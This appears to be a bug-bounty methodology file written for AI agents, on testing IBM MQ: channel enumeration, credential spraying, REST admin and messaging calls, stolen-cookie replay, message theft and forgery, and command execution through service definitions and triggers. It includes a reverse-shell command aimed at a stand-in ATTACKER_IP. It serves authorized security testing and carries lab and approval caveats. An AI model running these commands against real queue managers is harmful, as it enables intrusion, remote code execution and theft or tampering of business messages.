---
technology: "IBM MQ"
kind: bug-bounty-methodology
audience: ai-agent
status: upstream-only
family: messaging
version: "1.0"
source: "upstream-only; zero corpus evidence by design (owner-approved new-unit wave 2026-11-13) — MQSC/PCF/REST syntax and the CREATE_SERVICE warning verified against ibm.com/docs (9.2–9.4), mq-container developer-config, sensepost/punch-q README 2026-11-13 + rewritten from HackTricks (src/network-services-pentesting/1414-pentesting-ibmmq.md), CC BY-NC 4.0, accessed 2026-11-13"
provenance: "hybrid: corpus-grounded (1 ledger rows, internal coverage ledger) + HackTricks enrichment 2026-11-13; credit in source line"
---

# IBM MQ bug-bounty methodology

Companion overview: [[ibmmq]].

Scope: queue-manager and channel enumeration on 1414, the mqweb REST surface on 9443, CHLAUTH/OAM triage, message browse/put/dump, and administrative program-execution paths (service definition, triggering). Sibling brokers: [[activemq]], [[rabbitmq]].

## Phase 0 — Tooling

**punch-q** (SensePost; Python on pymqi, dockerized): message get/put/sniff, command execution via MQ services, credential brute modes. `docker run --rm -ti leonjza/punch-q`. **pymqi** (pip) for custom PCF; needs IBM MQ client libraries on the library path (`export LD_LIBRARY_PATH=/opt/mqm/lib64` with the redistributable client extracted there). Prefer a current redistributable client for new labs; the archived 9.0.0.4 RPM recipe (accept license, `rpm --prefix /opt/mqm -ivh --nodeps --force-debian ...`, strip the platform check in `mqlicense.sh` only in a disposable lab) is legacy, kept only to reproduce old tooling.

## Phase 1 — Enumeration on 1414

Queue-manager name (often unprotected):

```bash
docker run --rm -ti leonjza/punch-q --host 198.51.100.10 --port 1414 discover name
# Queue Manager name: MYQUEUEMGR
```

Channels (internal wordlist; developer images ship channels that accept no application credentials — try omitting `--username/--password` first):

```bash
docker run --rm -ti leonjza/punch-q --host 198.51.100.10 --port 1414 discover channels
# "DEV.ADMIN.SVRCONN" exists and was authorised.
# "SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
```

One working channel enumerates the rest — punch-q's `show channels -p '*'` (name, type, MCA user, conn name, SSL cipher) or pymqi PCF:

```python
import pymqi
qmgr = pymqi.connect('MYQUEUEMGR', 'DEV.ADMIN.SVRCONN', '198.51.100.10(1414)', 'admin', '<PASSWORD>')
pcf = pymqi.PCFExecute(qmgr)
for rec in pcf.MQCMD_INQUIRE_CHANNEL({pymqi.CMQCFC.MQCACH_CHANNEL_NAME: '*'}):
    print(rec[pymqi.CMQCFC.MQCACH_CHANNEL_NAME])
```

Queues similarly: `show queues -p '*'` (created, name, type, depth) or pymqi's inquire-queue pattern. A non-empty **SSL Cipher** column (or punch-q reporting the channel "wants SSL") means shift from spraying to artifact looting: hunt `AMQCLCHL.TAB`/JSON CCDTs (including `MQCCDTURL=https://...` — HTTPS-hosted CCDTs leak qmgr names, channels, hosts, ports, TLS needs without touching the server), `mqclient.ini`, `*.kdb`, `*.sth`, `*.p12` in app servers, CI jobs, containers, Kubernetes secrets.

Users / spraying: `punch-q discover users --channel DEV.ADMIN.SVRCONN` tests candidate credentials against a channel. MQ validates identities against the local OS or LDAP — include approved OS/directory/service-account candidates, do not assume reuse, and respect lockout policy. A TLS error instead of reason `2035` suggests the channel exists but wants `SSLCIPH` and possibly client certs; corroborate (gateways normalize errors).

## Phase 2 — mqweb on 9443

Console: `https://TARGET:9443/ibmmq/console`. Two APIs, different roles:

- **Administrative REST** (`MQWebAdmin`/`MQWebAdminRO`): executes MQSC remotely.
- **Messaging REST** (`MQWebUser` + OAM on the object): browse/put/delete messages. A dead `/admin/` does not imply `/messaging/` is absent (stand-alone web servers from 9.4.0 front remote qmgrs with messaging only).

```bash
# MQSC over the admin REST endpoint
curl -sku 'admin:<PASSWORD>' -H 'ibm-mq-rest-csrf-token: x' -H 'Content-Type: text/plain;charset=utf-8' \
  --data 'DISPLAY QMGR ALL' \
  https://198.51.100.10:9443/ibmmq/rest/v3/admin/action/qmgr/MYQUEUEMGR/mqsc
```

Token deployments: `POST /ibmmq/rest/v3/login` returns an **LtpaToken2** cookie replayable for both APIs until expiry (120 minutes by default) — a stolen cookie jar is both message access and admin.

## Phase 3 — CHLAUTH / OAM triage

"It connects but returns 2035" is a rule/permission wall. Find the firing rule (needs admin MQSC locally or via 9443):

```bash
echo "DISPLAY CHLAUTH(DEV.ADMIN.SVRCONN) MATCH(RUNCHECK) CLNTUSER('app') ADDRESS('198.51.100.99')" \
  | runmqsc MYQUEUEMGR
```

Over PCF, `MQCMD_INQUIRE_CHLAUTH_RECS` returns the records and their MCAUSER mappings — confirm whether the channel maps remote users to a privileged local account before trying object access.

Effective authorities, three equivalent views: `DISPLAY AUTHREC` (MQSC), `dspmqaut` (host shell), `MQCMD_INQUIRE_ENTITY_AUTH` (PCF). The two rows that gate remote PCF admin:

```bash
echo "DISPLAY AUTHREC PROFILE(SYSTEM.ADMIN.COMMAND.QUEUE) OBJTYPE(QUEUE) PRINCIPAL('app')" | runmqsc MYQUEUEMGR
echo "DISPLAY AUTHREC PROFILE(SYSTEM.DEFAULT.MODEL.QUEUE) OBJTYPE(QUEUE) PRINCIPAL('app')" | runmqsc MYQUEUEMGR
# host shell: dspmqaut -m MYQUEUEMGR -t queue -n SYSTEM.ADMIN.COMMAND.QUEUE -p app
```

## Phase 4 — Topics / pub-sub recon (state-changing — authorized labs)

```bash
echo "DISPLAY TOPIC(*) TOPICSTR" | runmqsc MYQUEUEMGR
echo "DISPLAY SUB(*) ALL"       | runmqsc MYQUEUEMGR
```

With admin rights, an administrative subscription routes a whole topic tree into a queue you control (`DEFINE QLOCAL(...)` + `DEFINE SUB(...) TOPICSTR('dev/#') DEST(...) DESTCLAS(PROVIDED)`); this changes qmgr state and can capture production traffic — record, approve, restore. App-level `pub`/`sub` rights alone do not grant administrative subscription creation.

## Phase 5 — Message operations

Non-destructive first, per in-scope queue:

```bash
docker run --rm -ti leonjza/punch-q --host 198.51.100.10 --port 1414 --username admin --password '<PASSWORD>' \
  --channel DEV.ADMIN.SVRCONN messages sniff    # watch without consuming
# messages dump   — destructive bulk read; avoid on production queues
```

Through 9443 when 1414 is blocked (browse / destructive get / forged put / topic publish):

```bash
curl -sku 'app:<PASSWORD>' https://198.51.100.10:9443/ibmmq/rest/v3/messaging/qmgr/MYQUEUEMGR/queue/DEV.QUEUE.1/message
curl -sku 'app:<PASSWORD>' -X DELETE -H 'ibm-mq-rest-csrf-token: x' \
  https://198.51.100.10:9443/ibmmq/rest/v3/messaging/qmgr/MYQUEUEMGR/queue/DEV.QUEUE.1/message
curl -sku 'app:<PASSWORD>' -X POST -H 'ibm-mq-rest-csrf-token: x' -H 'Content-Type: text/plain;charset=utf-8' \
  --data 'tamper-test' \
  https://198.51.100.10:9443/ibmmq/rest/v3/messaging/qmgr/MYQUEUEMGR/queue/DEV.QUEUE.1/message
```

**Pivot through QREMOTE:** an accessible remote-queue definition is a local name for another queue manager; `DISPLAY QREMOTE(*) RNAME RQMNAME XMITQ PUT` maps the route, a put to the local definition rides it. Local OAM checks the definition, not the resolved destination; `PUTAUT(DEF)` vs `PUTAUT(CTX)` changes who the far end sees — a successful local put does not prove remote delivery (confirm via marker, DLQ, or owner). Unrestricted `QALIAS` creation can similarly front objects the identity cannot open directly.

## Phase 6 — Program execution (admin paths)

**A. Service definition.** `MQCMD_CREATE_SERVICE` takes a `StartCommand` pointing at a local program; IBM's own warning: the command lets a user run an arbitrary command with queue-manager authority. Via punch-q:

```bash
docker run --rm -ti leonjza/punch-q --host 198.51.100.10 --port 1414 --username admin --password '<PASSWORD>' \
  --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
docker run --rm -ti leonjza/punch-q ... command reverse -i ATTACKER_IP -p 4444   # packaged bash/perl shells
```

Launch is asynchronous — verify via an approved side channel (lab marker file, logs, controlled callback). Via REST MQSC the same primitives are `DEFINE SERVICE(POC) CONTROL(MANUAL) SERVTYPE(COMMAND) STARTCMD('/bin/sh') STARTARG('-c id >/tmp/mq.id')`, then `START SERVICE(POC)`, then `DELETE SERVICE(POC)`.

**B. Triggering.** Where a trigger monitor already serves a queue's `INITQ`, swap the queue's `PROCESS` for one you define (`DEFINE PROCESS(...) APPLTYPE(UNIX) APPLICID('/bin/sh') USERDATA(...)`, `ALTER QLOCAL(APP.INPUT) PROCESS(...) TRIGGER TRIGTYPE(FIRST)`) and put one message to fire it; the triggered app runs as the trigger monitor's/queue manager's user. Recon first with `DISPLAY QLOCAL(*) INITQ PROCESS TRIGGER TRIGTYPE` and `DISPLAY PROCESS(*) APPLICID APPLTYPE USERDATA`. State-changing: record originals, restore.

**Custom PCF** for anything punch-q lacks — constants in `pymqi.CMQCFC` or raw numerics from IBM docs (e.g. `MQCMD_REFRESH_CLUSTER`, decimal 73, parameter `MQCA_CLUSTER_NAME` decimal 2029):

```python
response = pcf.MQCMD_REFRESH_CLUSTER({2029: "*"})
```

## Phase 7 — Lab

```bash
docker pull icr.io/ibm-messaging/mq:latest
docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:latest
```

Default developer config: `DEV.ADMIN.SVRCONN` (admin only) / `DEV.APP.SVRCONN` (app), `DEV.BASE.TOPIC` = `dev/`, app gets put/get/browse/inq/pub/sub on `DEV.*`. From 9.4.0 the users exist only if their passwords are injected (`mqAdminPassword`/`mqAppPassword` secrets; the `MQ_ADMIN_PASSWORD` env vars are deprecated).

## Appendix — tools in prose

punch-q and pymqi (PCF clients), runmqsc/dspmqaut (host-side MQSC and authority views), amqsputc with `MQSERVER`/`MQSAMP_USER_ID` (sample put client), curl (REST admin + messaging + login), docker/podman (lab).
